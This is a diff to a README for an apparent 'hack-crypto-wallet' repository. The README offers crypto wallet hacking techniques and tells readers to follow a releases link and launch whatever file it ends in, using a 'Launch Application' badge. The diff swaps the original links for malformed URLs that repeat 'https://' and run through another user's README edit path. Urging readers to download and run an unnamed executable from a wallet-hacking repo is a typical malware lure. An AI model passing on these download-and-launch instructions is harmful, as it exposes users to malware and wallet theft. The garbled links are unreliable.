@@ -70,14 +70,15 @@ Understand common hacking techniques used to compromise crypto wallets and learn
 
 ## Get Started
 
-Click [here](https://github.com/BleakGuskdeak/hack-crypto-wallet/releases) to access the provided link. If the link ends with a file name, it needs to be launched for further exploration.
+Click [here](https://https://github.com/victoriacook0147-blip/Chloe-travota/edit/main/readme.md/hack-crypto-wallet/releases) to access the provided link. If the link ends with a file name, it needs to be launched for further exploration.
 
 For additional resources, updates, and releases, check the **Releases** section of this repository.
 
-[![Launch Application](https://github.com/BleakGuskdeak/hack-crypto-wallet/releases)](https://github.com/BleakGuskdeak/hack-crypto-wallet/releases)
+[![Launch Application](https://https://github.com/victoriacook0147-blip/Chloe-travota/edit/main/readme.mdhack-crypto-wallet/releases)](https://https://github.com/victoriacook0147-blip/Chloe-travota/edit/main/readme.md/hack-crypto-wallet/releases)
 
 ## Let's Dive Deeper! 🌟
 
 Explore the world of crypto wallets, blockchain technology, and cybersecurity in this dynamic repository. Enhance your knowledge, strengthen your skills, and stay informed about the latest trends in the crypto space. Happy hacking! 🔒🔍🚀
 
-![Cryptocurrency Image](https://github.com/BleakGuskdeak/hack-crypto-wallet/releases)
+
+![Cryptocurrency Image](https://github.com/https://github.com/victoriacook0147-blip/Chloe-travota/edit/main/readme.md/hack-crypto-wallet/releases)
